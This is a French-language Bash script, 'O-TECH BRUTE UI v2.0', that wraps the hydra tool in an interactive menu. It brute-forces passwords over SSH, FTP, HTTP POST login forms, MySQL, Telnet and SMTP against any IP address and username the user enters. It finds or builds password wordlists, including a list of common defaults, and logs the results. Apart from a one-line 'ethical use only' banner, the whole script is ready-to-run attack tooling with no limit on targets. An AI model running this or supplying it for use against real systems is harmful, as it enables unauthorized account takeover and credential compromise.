#!/bin/bash
# ╔══════════════════════════════════════════════════════╗
# ║   O-TECH BRUTE UI  v2.0                              ║
# ║   Fix: shebang, wordlist path, hydra check amélioré ║
# ╚══════════════════════════════════════════════════════╝

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; MAGENTA='\033[0;35m'; DIM='\033[2m'; NC='\033[0m'; BOLD='\033[1m'

banner() {
  echo -e "${RED}"
  cat << 'EOF'
  ____  ____  _   _ _____ _____
 | __ )|  _ \| | | |_   _| ____|
 |  _ \| |_) | | | | | | |  _|
 | |_) |  _ <| |_| | | | | |___
 |____/|_| \_\\___/  |_| |_____|
EOF
  echo -e "${MAGENTA}  [ BRUTE-FORCE UI ] ${YELLOW}O-TECH TOOLS v2.0${NC}"
  echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${YELLOW}  [!] Usage ethique uniquement — vos systemes !${NC}"
  echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

check_tools() {
  if ! command -v hydra &>/dev/null; then
    echo -e "${YELLOW}[!] hydra non installe. Installation...${NC}"
    pkg install hydra -y
    if ! command -v hydra &>/dev/null; then
      echo -e "${RED}[X] Impossible d'installer hydra. Verifie ta connexion.${NC}"
      exit 1
    fi
  fi
  echo -e "${GREEN}[OK] hydra disponible : $(hydra -h 2>&1 | head -1)${NC}\n"
}

# Fix: cherche rockyou dans les paths connus de Termux
find_rockyou() {
  local paths=(
    "$HOME/rockyou.txt"
    "$HOME/wordlists/rockyou.txt"
    "/sdcard/rockyou.txt"
    "/data/data/com.termux/files/usr/share/wordlists/rockyou.txt"
    "/usr/share/wordlists/rockyou.txt"
  )
  for p in "${paths[@]}"; do
    [ -f "$p" ] && echo "$p" && return
  done
  echo ""
}

get_wordlist() {
  echo -e "\n${BOLD}${GREEN}  Wordlist :${NC}"
  echo -e "  ${CYAN}[1]${NC}  rockyou.txt"
  echo -e "  ${CYAN}[2]${NC}  Mini wordlist (generer automatiquement)"
  echo -e "  ${CYAN}[3]${NC}  Chemin custom\n"
  echo -ne "${YELLOW}[WL]> ${NC}"; read wl_choice

  case $wl_choice in
    1)
      RY=$(find_rockyou)
      if [ -n "$RY" ]; then
        WORDLIST="$RY"
        echo -e "${GREEN}[OK] Utilisation : $WORDLIST${NC}"
      else
        echo -e "${RED}[X] rockyou.txt introuvable.${NC}"
        echo -e "${DIM}    Place le fichier dans : $HOME/rockyou.txt${NC}"
        return 1
      fi ;;
    2)
      WORDLIST="$HOME/otech-wordlist.txt"
      cat > "$WORDLIST" << 'WEOF'
admin
password
123456
root
1234
pass
letmein
welcome
admin123
password123
test
guest
master
hello
qwerty
abc123
default
changeme
toor
administrator
login
user
secret
p@ssword
pass123
WEOF
      echo -e "${GREEN}[OK] Wordlist creee : $WORDLIST ($(wc -l < "$WORDLIST") passwords)${NC}" ;;
    3)
      echo -ne "${YELLOW}  Chemin complet : ${NC}"; read WORDLIST
      [ ! -f "$WORDLIST" ] && echo -e "${RED}[X] Fichier introuvable.${NC}" && return 1 ;;
    *)
      echo -e "${RED}[X] Choix invalide.${NC}"; return 1 ;;
  esac
}

menu() {
  echo -e "${BOLD}${GREEN}  Protocole cible :${NC}\n"
  echo -e "  ${CYAN}[1]${NC}  SSH"
  echo -e "  ${CYAN}[2]${NC}  FTP"
  echo -e "  ${CYAN}[3]${NC}  HTTP POST"
  echo -e "  ${CYAN}[4]${NC}  MySQL"
  echo -e "  ${CYAN}[5]${NC}  Telnet"
  echo -e "  ${CYAN}[6]${NC}  SMTP"
  echo -e "  ${RED}[0]${NC}  Quitter\n"
  echo -ne "${YELLOW}[BRUTE]> ${NC}"; read choice
}

run_brute() {
  echo -ne "${YELLOW}  IP cible : ${NC}"; read TARGET
  [ -z "$TARGET" ] && echo -e "${RED}[X] IP vide.${NC}" && return
  echo -ne "${YELLOW}  Username : ${NC}"; read USER
  [ -z "$USER" ] && echo -e "${RED}[X] Username vide.${NC}" && return

  get_wordlist || return

  LOGDIR="$HOME/otech-scans"
  mkdir -p "$LOGDIR"
  LOGFILE="$LOGDIR/brute_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"

  echo -e "\n${MAGENTA}[~] Lancement brute-force sur $TARGET ...${NC}\n"

  case $choice in
    1) hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh -t 4 -V 2>&1 | tee "$LOGFILE" ;;
    2) hydra -l "$USER" -P "$WORDLIST" "$TARGET" ftp -V 2>&1 | tee "$LOGFILE" ;;
    3)
      echo -ne "${YELLOW}  URL form (ex: /login.php) : ${NC}"; read FORMPATH
      echo -ne "${YELLOW}  Post data (ex: user=^USER^&pass=^PASS^) : ${NC}"; read POSTDATA
      echo -ne "${YELLOW}  Texte si echec (ex: Invalid) : ${NC}"; read FAILSTR
      hydra -l "$USER" -P "$WORDLIST" "$TARGET" \
        http-post-form "$FORMPATH:$POSTDATA:$FAILSTR" -V 2>&1 | tee "$LOGFILE" ;;
    4) hydra -l "$USER" -P "$WORDLIST" "$TARGET" mysql -V 2>&1 | tee "$LOGFILE" ;;
    5) hydra -l "$USER" -P "$WORDLIST" "$TARGET" telnet -V 2>&1 | tee "$LOGFILE" ;;
    6) hydra -l "$USER" -P "$WORDLIST" "$TARGET" smtp -V 2>&1 | tee "$LOGFILE" ;;
  esac

  echo -e "\n${GREEN}[OK] Log sauvegarde : $LOGFILE${NC}"
}

# === MAIN ===
clear
banner
check_tools
while true; do
  menu
  case $choice in
    0) echo -e "\n${CYAN}[O-TECH] Bye.${NC}\n"; exit 0 ;;
    [1-6]) run_brute ;;
    *) echo -e "${RED}[X] Option invalide.${NC}" ;;
  esac
  echo -e "\n${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
done
